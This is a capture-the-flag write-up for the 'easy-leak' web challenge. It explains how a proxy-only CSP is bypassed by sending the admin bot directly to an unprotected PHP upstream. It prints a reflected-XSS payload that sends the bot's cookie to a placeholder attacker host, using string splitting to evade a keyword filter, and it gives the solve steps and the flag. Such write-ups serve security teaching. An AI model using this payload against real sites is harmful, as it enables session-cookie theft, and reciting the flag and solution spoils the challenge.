# easy-leak

> Spoiler warning: This document contains the analysis and complete solution.

## Overview

| Field | Value |
|---|---|
| Status | solved |
| Event or platform | PwnSec CTF 2026 |
| Category | web |
| Difficulty | Medium |
| Flag format | `pwnsec{...}` |

The objective is to leak the admin bot's `TOKEN` cookie and submit it to `/api/verify`. The decisive observation is that CSP is added by the Caddy proxy on port 3000, not by the PHP application, while PHP development servers also listen on ports 9000 through 9003 of 127.0.0.1.

## Environment and Initial Analysis

The official input is [public.zip](../challenge/public.zip), with extracted files preserved under `../challenge/web` and `../challenge/bot`. The shared Python environment is restored from `../../../requirements.txt`.

`index.php` prints the `content` query value directly into the HTML body. Its length, character, and keyword checks still permit a `<script>` element. Responses on public port 3000 include a CSP with `script-src 'none'` and `frame-src 'none'`, so an ordinary reflected XSS cannot execute there. Immediately before a visit, the bot sets a `TOKEN_<16 hex>` cookie for 127.0.0.1 and keeps the page open for 20 seconds. The generated token remains valid at `/api/verify` for 60 seconds.

## Core Analysis

`entrypoint.sh` first starts four PHP servers:

```text
php -S 127.0.0.1:9000
php -S 127.0.0.1:9001
php -S 127.0.0.1:9002
php -S 127.0.0.1:9003
```

Caddy then listens on port 3000, proxies to these servers, and adds the CSP header. Navigating the bot directly to `http://127.0.0.1:9000/` therefore reaches the same PHP reflection sink without receiving the CSP.

The filter blocks `http` and `//`, so the external collector URL is split into JavaScript string fragments:

```html
<script>location='h'+'ttps:'+'/'+'/ATTACKER/leak?token='+document.cookie</script>
```

The bot performs a top-level visit, so the 127.0.0.1 cookie is attached regardless of the default `SameSite` policy. The script executes and sends `document.cookie` to the collector. A live request yielded a value in the form `TOKEN_9d2e821e1c4d5b9d`; submitting it to `/api/verify` before expiry returned the flag.

## Solution and Reproduction

[solve.py](../solve.py) reads the web and bot endpoints from `instance.json`, starts a temporary HTTP collector and a localhost.run reverse tunnel, and sends the XSS URL for internal port 9000 to `/api/report`. It extracts the token from the callback and submits it to `/api/verify`.

Activate the competition `.venv` and run from the challenge root:

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

## Result

`python solve.py` was verified with exit code 0, empty stderr, and a 24-byte stdout value without a trailing newline.

```text
pwnsec{e9a7ecb6d57f3bd7}
```

## Takeaways

A strong CSP is ineffective when it is applied only at a reverse proxy and the browser bot can directly reach an unprotected upstream. Admin-bot challenges must be analyzed from the bot's network perspective, including upstream ports and sidecar services rather than only the public URL. Keyword filters are also not a substitute for contextual HTML encoding or a URL allowlist because runtime string concatenation reconstructs blocked URL syntax.

## References

- [web/entrypoint.sh](../challenge/web/entrypoint.sh): PHP upstream ports and the location where Caddy adds CSP.
- [web/index.php](../challenge/web/index.php): reflection sink and keyword filter.
- [bot/conf.js](../challenge/bot/conf.js): cookie setup, visit duration, and internal address.
- [bot/index.js](../challenge/bot/index.js): report and verify APIs and token lifetime.
